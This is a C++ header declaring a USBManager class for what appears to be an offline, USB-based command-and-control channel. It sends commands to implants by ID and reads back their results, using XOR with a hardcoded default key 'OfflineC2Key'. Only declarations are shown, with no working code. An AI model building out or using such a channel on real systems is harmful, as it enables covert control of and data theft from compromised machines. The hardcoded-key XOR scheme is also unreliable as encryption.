#pragma once

#include <string>
#include <vector>

class USBManager {
public:
    struct USBDriveInfo {
        bool authorized = false;
        std::string driveLetter;
        uint64_t totalBytes = 0;
        uint64_t freeBytes = 0;
    };

    USBManager();
    ~USBManager();

    void SetUSBDriveLetter(const std::string& driveLetter);
    std::string GetUSBDriveLetter() const;
    bool HasAuthorizedUSB() const;
    USBDriveInfo GetDriveInfo() const;

    bool DetectAuthorizedUSB();
    void SetAutoDetect(bool enabled);
    bool IsAutoDetectEnabled() const;
    std::vector<std::string> PollResults();
    std::vector<std::string> ReadUSBResults();
    bool SendCommandToUSB(const std::string& implantId, const std::string& command);

    static std::string XOREncrypt(const std::string& data, const std::string& key = "OfflineC2Key");

private:
    bool EnsureDriveSelected();
    std::wstring DriveRoot() const;
    std::wstring CachePath() const;
    std::wstring ReturnPath() const;

    std::string usbDriveLetter_;
    bool usbAutoDetect_;
    std::string key_;
};
